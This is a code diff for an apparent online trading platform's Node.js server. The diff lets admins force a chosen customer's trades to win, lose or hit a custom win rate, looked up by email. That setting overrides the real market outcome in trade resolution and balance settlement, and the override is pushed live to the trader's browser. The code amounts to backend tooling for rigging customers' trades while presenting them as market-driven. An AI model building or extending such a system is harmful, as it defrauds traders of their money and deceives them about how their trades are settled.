@@ -52,7 +52,7 @@ function buildAdmins() {
   const admins = {};
   for (const d of defs) {
     if (!d.user || !d.pass) continue;
-    admins[d.user] = { password: d.pass, main: d.main, pnlConfig: { mode: "auto", customWinRate: 50 } };
+    admins[d.user] = { password: d.pass, main: d.main };
   }
   return admins;
 }
@@ -74,7 +74,14 @@ const sessions = new Map();
 // adminSockets: Map<socketId, adminUsername>
 const adminSockets = new Map();
 
+// customerSockets: Map<socketId, email> — a signed-in trader's live connection,
+// so an outcome change can be pushed to that one person and nobody else.
+const customerSockets = new Map();
+
 // ─── P&L HELPERS ─────────────────────────────────────────────────────────────
+// An outcome override lives on the customer's own account, so it decides that
+// person's trades and nobody else's. "auto" — the default for every new
+// account — lets the real market price decide.
 function resolveOutcome(marketWon, config) {
   switch (config.mode) {
     case "win":    return true;
@@ -84,10 +91,14 @@ function resolveOutcome(marketWon, config) {
   }
 }
 
-function getAdminConfig(username) {
-  return (username && ADMINS[username])
-    ? ADMINS[username].pnlConfig
-    : { mode: "auto", customWinRate: 50 };
+const DEFAULT_PNL = { mode: "auto", customWinRate: 50 };
+
+async function getUserPnlSafe(uid) {
+  try {
+    return await money.getUserPnl(uid);
+  } catch {
+    return DEFAULT_PNL;
+  }
 }
 
 // ─── HELPERS ──────────────────────────────────────────────────────────────────
@@ -103,16 +114,6 @@ function notifyAllAdmins(event, data) {
   });
 }
 
-function notifyAdminsByUsername(username, event, data) {
-  if (!io) return;
-  adminSockets.forEach((uname, sid) => {
-    if (uname === username) {
-      const s = io.sockets.sockets.get(sid);
-      if (s) s.emit(event, data);
-    }
-  });
-}
-
 function addAdminsToRoom(sessionId) {
   if (!io) return;
   adminSockets.forEach((_, sid) => {
@@ -121,15 +122,15 @@ function addAdminsToRoom(sessionId) {
   });
 }
 
-// Push this admin's current P&L config to all their assigned customers
-function pushPnlToAssignedCustomers(adminUsername) {
+// Push an outcome config to one customer's own sockets — never a broadcast.
+function pushPnlToCustomer(email, config) {
   if (!io) return;
-  const config = getAdminConfig(adminUsername);
-  sessions.forEach((session) => {
-    if (session.assignedAdmin === adminUsername && session.status !== "closed") {
-      const customerSocket = io.sockets.sockets.get(session.socketId);
-      if (customerSocket) customerSocket.emit("pnl:mode", config);
-    }
+  const target = String(email || "").trim().toLowerCase();
+  if (!target) return;
+  customerSockets.forEach((mail, sid) => {
+    if (mail !== target) return;
+    const s = io.sockets.sockets.get(sid);
+    if (s) s.emit("pnl:mode", config);
   });
 }
 
@@ -228,13 +229,12 @@ app.post("/api/admin/login", (req, res) => {
   res.json({ success: true, username, isMain: isMainAdmin(username) });
 });
 
-// Get pnl mode — returns this admin's config if authenticated, else returns auto
-app.get("/api/pnl-mode", (req, res) => {
-  const { username, password } = req.query;
-  if (username && authAdmin(username, password))
-    return res.json(ADMINS[username].pnlConfig);
-  res.json({ mode: "auto", customWinRate: 50 });
-});
+// A customer reads their own outcome mode — used only for the live
+// winning/losing indicator while a trade runs.
+app.get("/api/my-pnl", requireCustomer, asyncHandler(async (req, res) => {
+  await money.ensureUserDoc(req.user.uid, { email: req.user.email });
+  res.json(await getUserPnlSafe(req.user.uid));
+}));
 
 // Trade resolution — P&L mode + balance settle
 app.post("/api/trade/resolve", requireCustomer, asyncHandler(async (req, res) => {
@@ -244,7 +244,9 @@ app.post("/api/trade/resolve", requireCustomer, asyncHandler(async (req, res) =>
 
   const session   = sessions.get(sessionId);
   const adminName = session?.assignedAdmin || null;
-  const config    = getAdminConfig(adminName);
+  // The override that decides this trade belongs to the trader, not the admin
+  // who happens to be handling their chat.
+  const config    = await getUserPnlSafe(req.user.uid);
   const won       = resolveOutcome(marketWon, config);
 
   if (tradeId) {
@@ -303,6 +305,27 @@ app.post("/api/admin/users/set-balance", asyncHandler(async (req, res) => {
   res.json({ success: true, ...result });
 }));
 
+// Set ONE customer's trade outcome, found by their email. Nobody else is touched.
+app.post("/api/admin/users/pnl", asyncHandler(async (req, res) => {
+  const username = requireAdmin(req, res);
+  if (!username) return;
+  const result = await money.setPnlByEmail(
+    req.body.email,
+    { mode: req.body.mode, customWinRate: req.body.customWinRate },
+    { adminId: username },
+  );
+  pushPnlToCustomer(result.email, { mode: result.mode, customWinRate: result.customWinRate });
+  console.log(`[PnL] ${username} → ${result.email} = ${result.mode}`);
+  res.json({ success: true, ...result });
+}));
+
+// Every account currently overridden, so an admin can see exactly who is affected.
+app.get("/api/admin/pnl-overrides", asyncHandler(async (req, res) => {
+  const username = requireAdmin(req, res);
+  if (!username) return;
+  res.json({ users: await money.listPnlOverrides() });
+}));
+
 app.post("/api/admin/users/freeze", asyncHandler(async (req, res) => {
   const username = requireAdmin(req, res);
   if (!username) return;
@@ -336,8 +359,7 @@ app.get("/api/admin/oversight", asyncHandler(async (req, res) => {
     username: name,
     isMain: isMainAdmin(name),
     isYou: name === username,
-    pnlMode: ADMINS[name].pnlConfig.mode,
-    customWinRate: ADMINS[name].pnlConfig.customWinRate,
+    pnlChanges: 0,
     credited: 0,
     debited: 0,
     actions: 0,
@@ -355,6 +377,7 @@ app.get("/api/admin/oversight", asyncHandler(async (req, res) => {
     admin.actions += 1;
     if (e.type === "credit") admin.credited += amount;
     if (e.type === "debit") admin.debited += Math.abs(amount);
+    if (e.type === "pnl_mode") admin.pnlChanges += 1;
     if (e.email && !admin.customers.includes(e.email)) admin.customers.push(e.email);
     if (!admin.lastActionAt || e.createdAt > admin.lastActionAt) admin.lastActionAt = e.createdAt;
     if (admin.recent.length < 25) {
@@ -381,12 +404,15 @@ app.get("/api/admin/users/search", asyncHandler(async (req, res) => {
   const username = requireAdmin(req, res);
   if (!username) return;
   const user = await money.findUserByEmail(req.query.email);
+  const pnl = await getUserPnlSafe(user.uid);
   res.json({
     uid: user.uid,
     email: user.email,
     displayName: user.displayName || "",
     balance: Number(user.balance) || 0,
     frozen: !!user.frozen,
+    pnlMode: pnl.mode,
+    pnlWinRate: pnl.customWinRate,
   });
 }));
 
@@ -397,23 +423,6 @@ app.get("/api/admin/ledger", asyncHandler(async (req, res) => {
   res.json(rows);
 }));
 
-// Set this admin's P&L mode via REST
-app.post("/api/admin/pnl-mode", (req, res) => {
-  const { username, password, mode, customWinRate } = req.body;
-  if (!authAdmin(username, password))
-    return res.status(401).json({ error: "Unauthorized" });
-  if (!["auto", "win", "loss", "custom"].includes(mode))
-    return res.status(400).json({ error: "Invalid mode" });
-  ADMINS[username].pnlConfig = {
-    mode,
-    customWinRate: Number(customWinRate) || ADMINS[username].pnlConfig.customWinRate,
-  };
-  notifyAdminsByUsername(username, "pnl:mode", ADMINS[username].pnlConfig);
-  pushPnlToAssignedCustomers(username);
-  console.log(`[PnL] ${username} → ${mode}`);
-  res.json({ success: true, pnlConfig: ADMINS[username].pnlConfig });
-});
-
 // List all chat sessions (all admins can see all, assignedAdmin field shows ownership)
 app.get("/api/admin/chats", (req, res) => {
   const { username, password } = req.query;
@@ -423,14 +432,14 @@ app.get("/api/admin/chats", (req, res) => {
 });
 
 // Admin stats — includes per-admin session count
-app.get("/api/admin/stats", (req, res) => {
+app.get("/api/admin/stats", asyncHandler(async (req, res) => {
   const { username, password } = req.query;
   if (!authAdmin(username, password))
     return res.status(401).json({ error: "Unauthorized" });
   const all  = Array.from(sessions.values());
   const mine = all.filter((s) => s.assignedAdmin === username);
   res.json({
-    pnlConfig:        ADMINS[username].pnlConfig,
+    pnlOverrides:     (await money.listPnlOverrides()).length,
     totalSessions:    all.length,
     pendingSessions:  all.filter((s) => s.status === "pending").length,
     activeSessions:   all.filter((s) => s.status === "active").length,
@@ -440,7 +449,7 @@ app.get("/api/admin/stats", (req, res) => {
     moneyStore:       money.backendMode(),
     vercel:           IS_VERCEL,
   });
-});
+}));
 
 // ═══════════════════════════════════════════════════════════════════════════════
 //  SOCKET.IO (local / always-on hosts only — not available on Vercel serverless)
@@ -458,10 +467,17 @@ if (io) io.on("connection", (socket) => {
     sessions.forEach((_, sid) => socket.join(sid));
 
     socket.emit("admin:sessions", Array.from(sessions.values()));
-    socket.emit("pnl:mode", ADMINS[username].pnlConfig);
     socket.emit("admin:online", { online: true });
     io.emit("agent:status", { online: true });
     console.log(`[Admin] ${username} joined (socket: ${socket.id}) | admins online: ${adminSockets.size}`);
+  });
+
+  // ── Customer: identify the signed-in trader on this socket ────────────────
+  // Lets an outcome change reach exactly this person's browser, live.
+  socket.on("user:join", async ({ uid, email } = {}) => {
+    if (!email) return;
+    customerSockets.set(socket.id, String(email).trim().toLowerCase());
+    if (uid) socket.emit("pnl:mode", await getUserPnlSafe(String(uid)));
   });
 
   // ── Customer: rejoin existing session after reconnect ─────────────────────
@@ -473,10 +489,6 @@ if (io) io.on("connection", (socket) => {
     addAdminsToRoom(sessionId);
     socket.emit("chat:session", { sessionId, messages: session.messages });
     socket.emit("agent:status", { online: adminSockets.size > 0 });
-    // Push assigned admin's P&L so the visual indicator is accurate
-    if (session.assignedAdmin) {
-      socket.emit("pnl:mode", getAdminConfig(session.assignedAdmin));
-    }
   });
 
   // ── Customer: start session ────────────────────────────────────────────────
@@ -537,8 +549,6 @@ if (io) io.on("connection", (socket) => {
     // Permanently assign this admin to the session on their first reply
     if (!session.assignedAdmin) {
       session.assignedAdmin = username;
-      const customerSocket = io.sockets.sockets.get(session.socketId);
-      if (customerSocket) customerSocket.emit("pnl:mode", getAdminConfig(username));
       console.log(`[Chat] Session ${sessionId} assigned to ${username}`);
     }
 
@@ -564,21 +574,6 @@ if (io) io.on("connection", (socket) => {
     io.to(sessionId).emit("chat:read");
   });
 
-  // ── Admin: change their own P&L mode ──────────────────────────────────────
-  socket.on("admin:set-pnl", ({ mode, customWinRate, username, password }) => {
-    if (!authAdmin(username, password) || adminSockets.get(socket.id) !== username) return;
-    if (!["auto", "win", "loss", "custom"].includes(mode)) return;
-    ADMINS[username].pnlConfig = {
-      mode,
-      customWinRate: Number(customWinRate) || ADMINS[username].pnlConfig.customWinRate,
-    };
-    // Notify all sockets belonging to this admin
-    notifyAdminsByUsername(username, "pnl:mode", ADMINS[username].pnlConfig);
-    // Push updated config to all customers assigned to this admin
-    pushPnlToAssignedCustomers(username);
-    console.log(`[PnL] ${username} → ${mode}`);
-  });
-
   // ── Admin: close session ───────────────────────────────────────────────────
   socket.on("admin:close-session", ({ sessionId, username, password }) => {
     if (!authAdmin(username, password)) return;
@@ -596,6 +591,7 @@ if (io) io.on("connection", (socket) => {
   socket.on("disconnect", () => {
     const wasAdmin = adminSockets.has(socket.id);
     adminSockets.delete(socket.id);
+    customerSockets.delete(socket.id);
     if (wasAdmin && adminSockets.size === 0) {
       io.emit("agent:status", { online: false });
       console.log("[Admin] Last admin disconnected — customers notified");
